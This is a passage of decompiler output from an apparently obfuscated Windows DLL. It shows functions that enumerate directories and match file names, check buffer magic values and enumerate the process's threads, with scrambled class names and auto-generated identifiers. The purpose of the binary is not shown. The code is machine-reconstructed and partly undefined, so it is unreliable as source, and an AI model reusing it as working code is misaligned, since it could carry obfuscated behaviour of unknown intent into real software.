      SetLastError(v7);
      sub_10031190(v44);
      v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
      v4 = v44;
      goto LABEL_8;
    }
    *(_BYTE *)(this + 620) = 1;
    sub_1002E1A8(a2, 0);
    v56 = 1;
    LOBYTE(v63) = 0;
    v8 = &v54;
  }
  else
  {
    LOBYTE(v63) = 0;
    sub_10009F65(&v54);
LABEL_16:
    while ( !wcscmp((const wchar_t *)(this + 68), L".") || !wcscmp((const wchar_t *)(this + 68), L"..") )
    {
      if ( !FindNextFileW(*(HANDLE *)(this + 616), v5) )
      {
        v25 = GetLastError();
        if ( v25 == 18 )
        {
          *(_BYTE *)(this + 620) = 1;
          sub_1002E1A8(a2, 0);
          v63 = 0;
          v56 |= 1u;
          goto LABEL_4;
        }
        SetLastError(v25);
        sub_10031190(v43);
        v38 = (_ThrowInfo *)&_TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__;
        v4 = v43;
LABEL_8:
        _CxxThrowException(v4, v38);
      }
    }
    v9 = (v5->dwFileAttributes & 0x10) != 0;
    LOBYTE(v45) = v9;
    if ( v9 )
      ++*(_DWORD *)(this + 12);
    else
      ++*(_DWORD *)(this + 8);
    sub_10009D2C(&v51, (wchar_t *)(this + 68));
    v63 = 6;
    sub_10009D2C(&v54, asc_1008E32C);
    LOBYTE(v63) = 7;
    v11 = sub_10030F17(this, &v46);
    LOBYTE(v63) = 8;
    v12 = sub_1000A132(v53, (int)v11, (int)&v54);
    LOBYTE(v63) = 9;
    sub_1000A132(v49, (int)v12, (int)&v51);
    LOBYTE(v63) = 11;
    sub_10009F65(v53);
    LOBYTE(v63) = 12;
    sub_10009F65(&v46);
    LOBYTE(v63) = 13;
    sub_10009F65(&v54);
    LOBYTE(v63) = 14;
    sub_10009F65(&v51);
    sub_10031256(v40, (int)v49);
    LOBYTE(v63) = 15;
    v14 = 0;
    if ( *(_BYTE *)(this + 621) )
    {
      if ( !v9 )
      {
        v13 = sub_100316E9((int)v40, v53);
        LOBYTE(v63) = 16;
        v56 |= 2u;
        if ( sub_1000A959((int)v13, (int)&unk_10095618) )
          v14 = 1;
      }
    }
    v63 = 15;
    if ( (v56 & 2) != 0 )
    {
      v56 &= ~2u;
      sub_10009F65(v53);
    }
    if ( v14 )
    {
      LOBYTE(v63) = 17;
      sub_1001A649(v53, (int)v49, &v57);
      LOBYTE(v63) = 18;
      Block = operator new(0x38u);
      LOBYTE(v63) = 19;
      if ( Block )
      {
        v38 = v58;
        pCatchableTypeArray = v57.pCatchableTypeArray;
        pForwardCompat = v57.pForwardCompat;
        pmfnUnwind = v57.pmfnUnwind;
        v34 = v60;
        v33 = v59;
        v32 = (int *)((v57.attributes >> 4) & 0xFFFFFF01);
        attributes = (int *)v57.attributes;
        v30 = v61;
        v29 = v15;
        v28 = v15;
        v52 = &v28;
        sub_10009F32(&v28, (int)v53);
        LOBYTE(v63) = 20;
        v27 = v16;
        v26 = v16;
        lpAddend = &v26;
        sub_10009D2C(&v26, Source);
        LOBYTE(v63) = 19;
        v18 = sub_10030F50(
                v17,
                Block,
                v26,
                v27,
                v28,
                v29,
                v30,
                attributes,
                v32,
                (int)v33,
                v34,
                (int)pmfnUnwind,
                (int)pForwardCompat,
                (int)pCatchableTypeArray,
                (int)v38);
      }
      else
      {
        v18 = 0;
      }
      LOBYTE(v63) = 18;
      sub_1002E1A8(a2, (int)v18);
      v56 |= 1u;
      LOBYTE(v63) = 17;
      sub_10009F65(v53);
    }
    else
    {
      v19 = operator new(0x38u);
      v20 = v39;
      v50 = v19;
      LOBYTE(v63) = 23;
      if ( v19 )
      {
        v39 = *(_DWORD *)(this + 40);
        v38 = *(_ThrowInfo **)(this + 36);
        pCatchableTypeArray = *(CatchableTypeArray **)(this + 32);
        pForwardCompat = *(int (__cdecl **)())(this + 28);
        pmfnUnwind = *(PMFN *)(this + 48);
        v34 = *(_DWORD *)(this + 44);
        v33 = v45;
        v32 = *(int **)(this + 24);
        attributes = *(int **)(this + 56);
        v30 = v20;
        v29 = v20;
        lpAddend = &v29;
        sub_10009F32(&v29, (int)v49);
        LOBYTE(v63) = 24;
        v28 = v21;
        v27 = v21;
        v52 = &v27;
        sub_10009D2C(&v27, (wchar_t *)(this + 68));
        LOBYTE(v63) = 23;
        v23 = sub_10030F50(
                v22,
                v50,
                v27,
                v28,
                v29,
                v30,
                (int)attributes,
                v32,
                v33,
                v34,
                (int)pmfnUnwind,
                (int)pForwardCompat,
                (int)pCatchableTypeArray,
                (int)v38,
                v39);
      }
      else
      {
        v23 = 0;
      }
      LOBYTE(v63) = 15;
      sub_1002E1A8(&v54, (int)v23);
      LOBYTE(v63) = 26;
      v24 = lpAddend;
      a2[1] = (int)lpAddend;
      *a2 = v54;
      InterlockedIncrement(v24);
      v56 |= 1u;
      LOBYTE(v63) = 15;
      sub_1001B316(&v54);
    }
    LOBYTE(v63) = 14;
    sub_100315E2(v40);
    LOBYTE(v63) = 0;
    v8 = v49;
  }
  sub_10009F65(v8);
LABEL_4:
  sub_10056762();
}
// 1002DE63: variable 'v15' is possibly undefined
// 1002DE7E: variable 'v16' is possibly undefined
// 1002DEA3: variable 'v17' is possibly undefined
// 1002DF57: variable 'v21' is possibly undefined
// 1002DF76: variable 'v22' is possibly undefined
// 1002DAB2: using guessed type _DWORD pExceptionObject[5];
// 1002DAB2: using guessed type _DWORD var_2B0[5];
// 1002DAB2: using guessed type _DWORD var_2EC[5];
// 1002DAB2: using guessed type _DWORD var_28C[2];
// 1002DAB2: using guessed type int var_324[14];
// 1002DAB2: using guessed type wchar_t Source[282];
// 1002DAB2: using guessed type _DWORD var_2C4[5];

//----- (1002E025) --------------------------------------------------------
void __thiscall sub_1002E025(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 4;
  sub_100311FD(this + 4);
  sub_1000DF1A(v1);
}

//----- (1002E038) --------------------------------------------------------
_DWORD *__thiscall sub_1002E038(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax

  if ( a3 )
  {
    this[1] = &unk_10074B00;
    this[2] = &unk_10074B08;
    if ( a2 )
      v4 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) + a2 + 4;
    else
      v4 = 0;
    sub_1000DEB4(this + 4, v4);
  }
  sub_1002E0D4(this, a2, 0);
  sub_1000936A(this + 2, a2 != 0 ? (_DWORD *)(a2 + 8) : 0, 0);
  v5 = this[1];
  *this = &off_10074AF4;
  *(_DWORD *)((char *)this + *(_DWORD *)(v5 + 4) + 4) = &off_10074AF8;
  return this;
}
// 10074AF4: using guessed type int (*off_10074AF4)();
// 10074AF8: using guessed type int (__stdcall *off_10074AF8)(char);

//----- (1002E0D4) --------------------------------------------------------
_DWORD *__thiscall sub_1002E0D4(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax

  if ( a3 )
  {
    v4 = a2;
    this[1] = &unk_10074AEC;
    if ( a2 )
      v4 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) + a2 + 4;
    sub_1000DEB4(this + 2, v4);
  }
  v5 = this[1];
  *this = &off_10074AE0;
  *(_DWORD *)((char *)this + *(_DWORD *)(v5 + 4) + 4) = &off_10074AE4;
  return this;
}
// 10074AE0: using guessed type void (__noreturn *off_10074AE0)();
// 10074AE4: using guessed type int (__stdcall *off_10074AE4)(char);

//----- (1002E13D) --------------------------------------------------------
char *__thiscall sub_1002E13D(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 4);
  sub_1002E025(this - 4);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1002E15F) --------------------------------------------------------
_DWORD *__thiscall sub_1002E15F(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // ecx

  v2 = this - 2;
  sub_1003117A(this);
  sub_1000DF1A(v3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}
// 1002E16E: variable 'v3' is possibly undefined

//----- (1002E1A8) --------------------------------------------------------
_DWORD *__userpurge sub_1002E1A8@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1002E1E7) --------------------------------------------------------
_DWORD *__stdcall sub_1002E1E7(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074148;
  return a1;
}
// 10074148: using guessed type int (__thiscall *off_10074148)(void *Block, char);

//----- (1002E215) --------------------------------------------------------
void __thiscall sub_1002E215(_DWORD *this)
{
  *this = &off_10074148;
  sub_1000DF1A(this);
}
// 10074148: using guessed type int (__thiscall *off_10074148)(void *Block, char);

//----- (1002E239) --------------------------------------------------------
_DWORD *__userpurge sub_1002E239@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  sub_10033785(a1, a2);
  sub_10019D5C(a2 + 8);
  return a2;
}

//----- (1002E269) --------------------------------------------------------
int __thiscall sub_1002E269(_DWORD *this, int a2)
{
  _DWORD *v2; // esi

  v2 = this + 8;
  (*(void (__thiscall **)(_DWORD *))(this[8] + 20))(this + 8);
  (*(void (__thiscall **)(_DWORD *, int))(*v2 + 36))(v2, a2);
  return a2;
}

//----- (1002E2A5) --------------------------------------------------------
bool sub_1002E2A5()
{
  return dword_1008E11C == 10485760 || sub_10031A1B(0xA00000u);
}
// 1008E11C: using guessed type int dword_1008E11C;

//----- (1002E2C9) --------------------------------------------------------
int __fastcall sub_1002E2C9(int a1, _DWORD *a2)
{
  int *v3; // eax
  _DWORD *v4; // eax
  int v5; // esi
  _DWORD v7[17]; // [esp+10h] [ebp-68h] BYREF
  int v8[5]; // [esp+54h] [ebp-24h] BYREF
  int v9[3]; // [esp+68h] [ebp-10h] BYREF
  int v10; // [esp+74h] [ebp-4h]

  sub_1002E239(a2, v7);
  v10 = 0;
  sub_10033464(v7, v7);
  v9[0] = -2069057649;
  v3 = (int *)sub_1000C28D((void *)4, (int)v8, v9);
  LOBYTE(v10) = 1;
  sub_1000C439(v3, a1);
  LOBYTE(v10) = 0;
  sub_1000C45D(v8);
  v4 = (_DWORD *)sub_1002E269(v7, (int)v8);
  LOBYTE(v10) = 2;
  sub_1000C5DF(v4, a1);
  LOBYTE(v10) = 0;
  sub_1000C45D(v8);
  v5 = *(_DWORD *)(a1 + 12);
  v10 = -1;
  sub_1002E35A((int)v7);
  return v5;
}
// 1002E2C9: using guessed type _DWORD var_68[17];
// 1002E2C9: using guessed type int var_10[3];
// 1002E2C9: using guessed type int var_24[5];

//----- (1002E35A) --------------------------------------------------------
void __stdcall sub_1002E35A(int a1)
{
  sub_10019DBF(a1 + 32);
  sub_100337E2(a1);
}

//----- (1002E388) --------------------------------------------------------
int __fastcall sub_1002E388(int a1, int *a2)
{
  const void *v4; // eax
  _DWORD *v6; // eax
  int *v7; // eax
  int v8; // esi
  _DWORD v9[17]; // [esp+10h] [ebp-68h] BYREF
  int v10[5]; // [esp+54h] [ebp-24h] BYREF
  int v11[3]; // [esp+68h] [ebp-10h] BYREF
  int v12; // [esp+74h] [ebp-4h]

  v4 = (const void *)sub_1000C52E(a2);
  memcpy(v11, v4, 4u);
  if ( v11[0] != -2069057649 )
    return 0;
  v6 = (_DWORD *)sub_1000C709(a2[3] - 4, a2, (int)v10, 4);
  v12 = 0;
  sub_1002E239(v6, v9);
  LOBYTE(v12) = 2;
  sub_1000C45D(v10);
  sub_100335E3(v9, v9);
  v7 = (int *)sub_1002E269(v9, (int)v10);
  LOBYTE(v12) = 3;
  sub_1000C439(v7, a1);
  LOBYTE(v12) = 2;
  sub_1000C45D(v10);
  v8 = *(_DWORD *)(a1 + 12);
  v12 = -1;
  sub_1002E35A((int)v9);
  return v8;
}
// 1002E388: using guessed type int var_24[5];
// 1002E388: using guessed type _DWORD var_68[17];

//----- (1002E433) --------------------------------------------------------
_DWORD *__thiscall sub_1002E433(_DWORD *Block, char a2)
{
  *Block = &off_10074B18;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074B18: using guessed type int (__thiscall *off_10074B18)(void *Block, char);

//----- (1002E45A) --------------------------------------------------------
_DWORD *__stdcall sub_1002E45A(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_100741D8;
  return a1;
}
// 100741D8: using guessed type int (__thiscall *off_100741D8)(void *Block, char);

//----- (1002E488) --------------------------------------------------------
void __thiscall sub_1002E488(_DWORD *this)
{
  *this = &off_100741D8;
  sub_1000DF1A(this);
}
// 100741D8: using guessed type int (__thiscall *off_100741D8)(void *Block, char);

//----- (1002E4AC) --------------------------------------------------------
_DWORD *__stdcall sub_1002E4AC(_DWORD *a1)
{
  sub_1002E45A(a1);
  *a1 = &off_100741E0;
  return a1;
}
// 100741E0: using guessed type int (__thiscall *off_100741E0)(void *Block, char);

//----- (1002E4D9) --------------------------------------------------------
void __thiscall sub_1002E4D9(_DWORD *this)
{
  *this = &off_100741E0;
  sub_1002E488(this);
}
// 100741E0: using guessed type int (__thiscall *off_100741E0)(void *Block, char);

//----- (1002E4FD) --------------------------------------------------------
_DWORD *__stdcall sub_1002E4FD(_DWORD *a1)
{
  sub_1002E45A(a1);
  *a1 = &off_100741E8;
  return a1;
}
// 100741E8: using guessed type int (__thiscall *off_100741E8)(void *Block, char);

//----- (1002E52A) --------------------------------------------------------
void __thiscall sub_1002E52A(_DWORD *this)
{
  *this = &off_100741E8;
  sub_1002E488(this);
}
// 100741E8: using guessed type int (__thiscall *off_100741E8)(void *Block, char);

//----- (1002E54E) --------------------------------------------------------
_DWORD *__stdcall sub_1002E54E(_DWORD *a1)
{
  sub_1002E45A(a1);
  *a1 = &off_10074278;
  return a1;
}
// 10074278: using guessed type int (__thiscall *off_10074278)(void *Block, char);

//----- (1002E57B) --------------------------------------------------------
void __thiscall sub_1002E57B(_DWORD *this)
{
  *this = &off_10074278;
  sub_1002E488(this);
}
// 10074278: using guessed type int (__thiscall *off_10074278)(void *Block, char);

//----- (1002E59F) --------------------------------------------------------
_DWORD *__stdcall sub_1002E59F(_DWORD *a1)
{
  sub_1002E45A(a1);
  *a1 = &off_10074250;
  return a1;
}
// 10074250: using guessed type int (__thiscall *off_10074250)(void *Block, char);

//----- (1002E5CC) --------------------------------------------------------
void __thiscall sub_1002E5CC(_DWORD *this)
{
  *this = &off_10074250;
  sub_1002E488(this);
}
// 10074250: using guessed type int (__thiscall *off_10074250)(void *Block, char);

//----- (1002E5F0) --------------------------------------------------------
_DWORD *__stdcall sub_1002E5F0(_DWORD *a1)
{
  sub_1002E45A(a1);
  *a1 = &off_10074258;
  return a1;
}
// 10074258: using guessed type int (__thiscall *off_10074258)(void *Block, char);

//----- (1002E61D) --------------------------------------------------------
void __thiscall sub_1002E61D(_DWORD *this)
{
  *this = &off_10074258;
  sub_1002E488(this);
}
// 10074258: using guessed type int (__thiscall *off_10074258)(void *Block, char);

//----- (1002E641) --------------------------------------------------------
_DWORD *__stdcall sub_1002E641(_DWORD *a1)
{
  sub_1002E45A(a1);
  *a1 = &off_10074260;
  return a1;
}
// 10074260: using guessed type int (__thiscall *off_10074260)(void *Block, char);

//----- (1002E66E) --------------------------------------------------------
int __thiscall sub_1002E66E(_DWORD *this)
{
  *this = &off_10074260;
  return sub_1002E488();
}
// 10074260: using guessed type int (__thiscall *off_10074260)(void *Block, char);

//----- (1002E692) --------------------------------------------------------
_DWORD *__stdcall sub_1002E692(_DWORD *a1, int a2)
{
  *a1 = off_10074B20;
  sub_10009F32(a1 + 1, a2);
  sub_10009F32(a1 + 3, (int)&unk_100955B0);
  sub_1002E933(a1 + 5, (int)(a1 + 1), (int)(a1 + 3), 0);
  sub_1002E933(a1 + 12, (int)(a1 + 1), (int)(a1 + 3), *(_DWORD *)(a1[2] + 28));
  return a1;
}
// 10074B20: using guessed type int (__thiscall *off_10074B20[3])(void *Block, char);

//----- (1002E6F9) --------------------------------------------------------
int *__thiscall sub_1002E6F9(int *Block, char a2)
{
  sub_1002E779(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E718) --------------------------------------------------------
_DWORD *__userpurge sub_1002E718@<eax>(int a1@<ebx>, _DWORD *a2)
{
  *a2 = off_10074B20;
  sub_10009F32(a2 + 1, a1 + 4);
  sub_10009F32(a2 + 3, a1 + 12);
  sub_1002E8E0(a1 + 20, a2 + 5);
  sub_1002E8E0(a1 + 48, a2 + 12);
  return a2;
}
// 10074B20: using guessed type int (__thiscall *off_10074B20[3])(void *Block, char);

//----- (1002E779) --------------------------------------------------------
void __thiscall sub_1002E779(int *this)
{
  *this = (int)off_10074B20;
  sub_1002E984(this + 12);
  sub_1002E984(this + 5);
  sub_10009F65(this + 3);
  sub_10009F65(this + 1);
}
// 10074B20: using guessed type int (__thiscall *off_10074B20[3])(void *Block, char);

//----- (1002E818) --------------------------------------------------------
_DWORD *__thiscall sub_1002E818(void *this, _DWORD *a2)
{
  sub_1002E8E0((int)this + 20, a2);
  return a2;
}

//----- (1002E84B) --------------------------------------------------------
_DWORD *__thiscall sub_1002E84B(void *this, _DWORD *a2)
{
  sub_1002E8E0((int)this + 48, a2);
  return a2;
}

//----- (1002E87E) --------------------------------------------------------
_DWORD *__stdcall sub_1002E87E(_DWORD *a1)
{
  *a1 = off_10074B24;
  sub_10009D2C(a1 + 1, &word_1008E2EC);
  sub_10009D2C(a1 + 3, &word_1008E2F0);
  return a1;
}
// 10074B24: using guessed type int (__thiscall *off_10074B24[2])(void *Block, char);

//----- (1002E8C1) --------------------------------------------------------
int *__thiscall sub_1002E8C1(int *Block, char a2)
{
  sub_1002E984(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E8E0) --------------------------------------------------------
_DWORD *__userpurge sub_1002E8E0@<eax>(int a1@<esi>, _DWORD *a2)
{
  *a2 = off_10074B24;
  sub_10009F32(a2 + 1, a1 + 4);
  sub_10009F32(a2 + 3, a1 + 12);
  a2[5] = *(_DWORD *)(a1 + 20);
  a2[6] = sub_1002EA77(a2);
  return a2;
}
// 10074B24: using guessed type int (__thiscall *off_10074B24[2])(void *Block, char);

//----- (1002E933) --------------------------------------------------------
_DWORD *__stdcall sub_1002E933(_DWORD *a1, int a2, int a3, int a4)
{
  *a1 = off_10074B24;
  sub_10009F32(a1 + 1, a2);
  sub_10009F32(a1 + 3, a3);
  a1[5] = a4;
  a1[6] = sub_1002EA77(a1);
  return a1;
}
// 10074B24: using guessed type int (__thiscall *off_10074B24[2])(void *Block, char);

//----- (1002E984) --------------------------------------------------------
void __thiscall sub_1002E984(int *this)
{
  *this = (int)off_10074B24;
  sub_10009F65(this + 3);
  sub_10009F65(this + 1);
}
// 10074B24: using guessed type int (__thiscall *off_10074B24[2])(void *Block, char);

//----- (1002E9B9) --------------------------------------------------------
_DWORD *__usercall sub_1002E9B9@<eax>(_DWORD *a1@<eax>)
{
  unsigned int v2; // eax
  int v3; // ecx

  v2 = a1[6];
  v3 = a1[2];
  a1[5] = v2;
  if ( v2 < *(_DWORD *)(v3 + 28) )
  {
    a1[5] = v2 + 1;
    a1[6] = sub_1002EA77(a1);
  }
  return a1;
}

//----- (1002E9DA) --------------------------------------------------------
_DWORD *__thiscall sub_1002E9DA(_DWORD *this, _DWORD *a2)
{
  rsize_t v3; // edi
  wchar_t *v4; // eax
  wchar_t *v5; // eax
  unsigned int v7; // [esp-Ch] [ebp-50h]
  const wchar_t *v8; // [esp-8h] [ebp-4Ch]
  int v9[5]; // [esp+10h] [ebp-34h] BYREF
  _DWORD pExceptionObject[3]; // [esp+24h] [ebp-20h] BYREF
  int v11; // [esp+30h] [ebp-14h]
  int v12; // [esp+34h] [ebp-10h]
  int v13; // [esp+40h] [ebp-4h]

  v11 = 0;
  v3 = this[6] - this[5];
  v12 = this[5];
  sub_1000C28D((void *)(2 * v3 + 2), (int)v9, 0);
  v13 = 1;
  v8 = (const wchar_t *)(*(_DWORD *)(this[2] + 12) + 2 * v12);
  v7 = (unsigned int)v9[3] >> 1;
  v4 = (wchar_t *)sub_1000C50A(v9);
  if ( wcsncpy_s(v4, v7, v8, v3) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = (wchar_t *)sub_1000C52E(v9);
  sub_10009D2C(a2, v5);
  v11 = 1;
  LOBYTE(v13) = 0;
  sub_1000C45D(v9);
  return a2;
}
// 1002E9DA: using guessed type _DWORD pExceptionObject[3];

//----- (1002EA77) --------------------------------------------------------
unsigned int __usercall sub_1002EA77@<eax>(_DWORD *a1@<edi>)
{
  unsigned int i; // esi
  int v2; // eax

  for ( i = a1[5]; ; ++i )
  {
    v2 = a1[2];
    if ( i >= *(_DWORD *)(v2 + 28) || wcschr(*(const wchar_t **)(a1[4] + 12), *(_WORD *)(*(_DWORD *)(v2 + 12) + 2 * i)) )
      break;
  }
  return i;
}

//----- (1002EAA4) --------------------------------------------------------
int *__usercall sub_1002EAA4@<eax>(int *a1@<ebx>, int *a2@<esi>)
{
  if ( a2 != a1 )
  {
    sub_100021B1(a1 + 2, a2 + 2);
    sub_100021B1(a1 + 4, a2 + 4);
    a2[5] = a1[5];
    a2[6] = a1[6];
  }
  return a2;
}

//----- (1002EACF) --------------------------------------------------------
bool __usercall sub_1002EACF@<al>(int a1@<edi>, int a2@<esi>)
{
  return a1 == a2
      || *(_DWORD *)(a1 + 20) == *(_DWORD *)(a2 + 20)
      && !sub_1000A1C0(a2 + 4, a1 + 4)
      && !sub_1000A1C0(a2 + 12, a1 + 12);
}

//----- (1002EB0E) --------------------------------------------------------
_DWORD *__stdcall sub_1002EB0E(_DWORD *a1, int a2)
{
  sub_10025A41((int)a1, a2, 0);
  *a1 = &off_10074B28;
  return a1;
}
// 10074B28: using guessed type int (__thiscall *off_10074B28)(void *Block, char);

//----- (1002EB40) --------------------------------------------------------
_BYTE *__thiscall sub_1002EB40(_BYTE *Block, char a2)
{
  sub_1002EB5F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002EB5F) --------------------------------------------------------
void __thiscall sub_1002EB5F(_BYTE *this)
{
  *(_DWORD *)this = &off_10074B28;
  sub_10025A99(this);
}
// 10074B28: using guessed type int (__thiscall *off_10074B28)(void *Block, char);

//----- (1002EB83) --------------------------------------------------------
void __thiscall sub_1002EB83(void *this, int a2, unsigned int a3)
{
  unsigned int i; // esi
  char pExceptionObject[8]; // [esp+8h] [ebp-8h] BYREF

  for ( i = 0; i < a3; ++i )
  {
    if ( !(*(int (__thiscall **)(void *, unsigned int))(*(_DWORD *)this + 16))(this, i + a2) )
    {
      sub_1000EA5A(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
    }
  }
}
// 1000EA5A: using guessed type _DWORD __stdcall sub_1000EA5A(_DWORD);

//----- (1002EBC8) --------------------------------------------------------
__int16 __thiscall sub_1002EBC8(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 64))(this, &v2, 2);
  return (__int16)v2;
}

//----- (1002EBDD) --------------------------------------------------------
int __thiscall sub_1002EBDD(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 64))(this, &v2, 4);
  return (int)v2;
}

//----- (1002EBF1) --------------------------------------------------------
_DWORD *__thiscall sub_1002EBF1(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  int v6[5]; // [esp+10h] [ebp-3Ch] BYREF
  int v7[5]; // [esp+24h] [ebp-28h] BYREF
  int v8; // [esp+38h] [ebp-14h]
  char v9[9]; // [esp+3Fh] [ebp-Dh] BYREF
  int v10; // [esp+48h] [ebp-4h]

  v8 = 0;
  sub_1000C28D(0, (int)v7, 0);
  v10 = 1;
  while ( 1 )
  {
    v4 = (*(int (__thiscall **)(void *, char *))(*(_DWORD *)this + 16))(this, v9);
    if ( !v9[0] || !v4 )
      break;
    v3 = (_DWORD *)sub_1000C28D((void *)1, (int)v6, v9);
    LOBYTE(v10) = 2;
    sub_1000C5DF(v3, (int)v7);
    LOBYTE(v10) = 1;
    sub_1000C45D(v6);
  }
  sub_10009F06(a2);
  v8 = 1;
  LOBYTE(v10) = 0;
  sub_1000C45D(v7);
  return a2;
}
// 1002EBF1: using guessed type int var_28[5];
// 1002EBF1: using guessed type int var_3C[5];

//----- (1002EC78) --------------------------------------------------------
char sub_1002EC78()
{
  return 1;
}

//----- (1002EC8C) --------------------------------------------------------
int sub_1002EC8C()
{
  return 0;
}

//----- (1002EC8F) --------------------------------------------------------
char sub_1002EC8F()
{
  return 1;
}

//----- (1002EC93) --------------------------------------------------------
int __thiscall sub_1002EC93(_DWORD *this)
{
  return this[1];
}

//----- (1002EC97) --------------------------------------------------------
bool __thiscall sub_1002EC97(_DWORD *this)
{
  bool result; // al

  *this = &off_10074B80;
  result = sub_1000F1E1(this + 2);
  *this = &off_10074B6C;
  return result;
}
// 10074B6C: using guessed type void (__noreturn *off_10074B6C)();
// 10074B80: using guessed type int (__thiscall *off_10074B80)(void *Block, char);

//----- (1002ECCA) --------------------------------------------------------
_DWORD *__thiscall sub_1002ECCA(_DWORD *Block, char a2)
{
  sub_1002EC97(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002ECE9) --------------------------------------------------------
_DWORD *__userpurge sub_1002ECE9@<eax>(int a1@<ebx>, _DWORD *a2)
{
  int v2; // eax
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-50h]
  _DWORD v6[14]; // [esp+10h] [ebp-3Ch] BYREF
  int v7; // [esp+48h] [ebp-4h]

  v2 = *(_DWORD *)(a1 + 4);
  *a2 = &off_10074B6C;
  a2[1] = v2;
  v7 = 0;
  *a2 = &off_10074B80;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10025D50((int)(a2 + 2), (void *)0xFFFFFFFF, 0, 0, v3, CurrentProcessId);
  LOBYTE(v7) = 1;
  sub_1002ED52((int)v6, *(_DWORD *)(a1 + 4));
  LOBYTE(v7) = 1;
  sub_1002EC97(v6);
  return a2;
}
// 10074B6C: using guessed type void (__noreturn *off_10074B6C)();
// 10074B80: using guessed type int (__thiscall *off_10074B80)(void *Block, char);
// 1002ECE9: using guessed type _DWORD var_3C[14];

//----- (1002ED52) --------------------------------------------------------
int __stdcall sub_1002ED52(int a1, int a2)
{
  DWORD v2; // eax
  HANDLE Toolhelp32Snapshot; // eax
  DWORD v5; // [esp-8h] [ebp-30h]
  void *v6; // [esp-8h] [ebp-30h]
  DWORD CurrentProcessId; // [esp-4h] [ebp-2Ch]
  DWORD v8; // [esp-4h] [ebp-2Ch]
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  *(_DWORD *)a1 = &off_10074B6C;
  *(_DWORD *)(a1 + 4) = a2;
  v10 = 0;
  *(_DWORD *)a1 = &off_10074B80;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10025D50(a1 + 8, (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
  LOBYTE(v10) = 1;
  *(_BYTE *)(a1 + 44) = 0;
  v8 = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(4u, 0);
  sub_10014EC9((HANDLE *)(a1 + 8), Toolhelp32Snapshot, 0, 0, v5, v8);
  if ( *(_DWORD *)(a1 + 12) == -1 )
  {
LABEL_2:
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  memset((void *)(a1 + 16), 0, 0x1Cu);
  v6 = *(void **)(a1 + 12);
  *(_DWORD *)(a1 + 16) = 28;
  if ( Thread32First(v6, (LPTHREADENTRY32)(a1 + 16)) )
  {
    if ( *(_DWORD *)(a1 + 28) != *(_DWORD *)(a1 + 4) )
      sub_1002EE26(a1);
  }
  else
  {
    *(_BYTE *)(a1 + 44) = 1;
    if ( GetLastError() != 18 )
      goto LABEL_2;
  }
  return a1;
}
// 10074B6C: using guessed type void (__noreturn *off_10074B6C)();
// 10074B80: using guessed type int (__thiscall *off_10074B80)(void *Block, char);
// 1002ED52: using guessed type _DWORD pExceptionObject[5];

//----- (1002EE22) --------------------------------------------------------
char __thiscall sub_1002EE22(_BYTE *this)
{
  return this[44];
}

//----- (1002EE26) --------------------------------------------------------
DWORD __thiscall sub_1002EE26(int this)
{
  _DWORD *v2; // edi
  DWORD result; // eax
  void *v4; // [esp-8h] [ebp-20h]
  _DWORD v5[3]; // [esp+8h] [ebp-10h] BYREF
  int pExceptionObject; // [esp+14h] [ebp-4h] BYREF

  if ( *(_BYTE *)(this + 44) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v2 = (_DWORD *)(this + 16);
  while ( 1 )
  {
    memset((void *)(this + 16), 0, 0x1Cu);
    v4 = *(void **)(this + 12);
    *v2 = 28;
    result = Thread32Next(v4, (LPTHREADENTRY32)(this + 16));
    if ( !result )
      break;
    if ( !*(_BYTE *)(this + 44) )
    {
      result = *(_DWORD *)(this + 28);
      if ( result != *(_DWORD *)(this + 4) )
        continue;
    }
